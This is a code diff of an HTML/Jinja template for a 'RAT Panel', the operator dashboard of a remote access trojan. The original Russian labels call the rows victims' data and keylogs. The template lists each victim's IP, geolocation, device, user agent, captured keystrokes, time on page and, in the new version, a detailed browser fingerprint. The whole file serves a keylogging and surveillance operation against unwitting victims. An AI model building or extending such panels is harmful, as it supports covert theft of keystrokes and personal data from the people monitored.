@@ -1,21 +1,33 @@
 <!DOCTYPE html>
-<html>
-<head><title>RAT Панель</title></head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>RAT Panel</title>
+</head>
 <body>
-<h2>Данные жертв:</h2>
-{% for log in logs %}
-  <p>
-    <b>{{ log.time }}</b><br>
-    {% if log.type == 'info' %}
-      IP: {{ log.ip }}<br>
-      GEO: {{ log.loc }}<br>
-      Устройство: {{ log.platform }}<br>
-      UA: {{ log.ua }}<br>
-    {% elif log.type == 'keys' %}
-      <b>Кейлоги:</b> {{ log.keys }}
-    {% endif %}
-    <hr>
-  </p>
-{% endfor %}
+    <h1>Собранные данные</h1>
+    <ul>
+    {% for log in logs %}
+      <li>
+        [{{ log.time }}] {{ log.type }}: 
+        {% if log.type == 'info' %}
+          <br>UserAgent: {{ log.data.userAgent }}<br>
+          Language: {{ log.data.language }}<br>
+          Platform: {{ log.data.platform }}<br>
+          Screen: {{ log.data.screenWidth }}x{{ log.data.screenHeight }}<br>
+          Timezone: {{ log.data.timezone }}<br>
+          Online: {{ log.data.online }}<br>
+          Cookies Enabled: {{ log.data.cookiesEnabled }}<br>
+          Plugins: {{ log.data.plugins | join(', ') }}<br>
+        {% elif log.type == 'keys' %}
+          Keys: {{ log.keys }}
+        {% elif log.type == 'timespent' %}
+          Time spent (ms): {{ log.milliseconds }}
+        {% else %}
+          {{ log }}
+        {% endif %}
+      </li>
+    {% endfor %}
+    </ul>
 </body>
 </html>
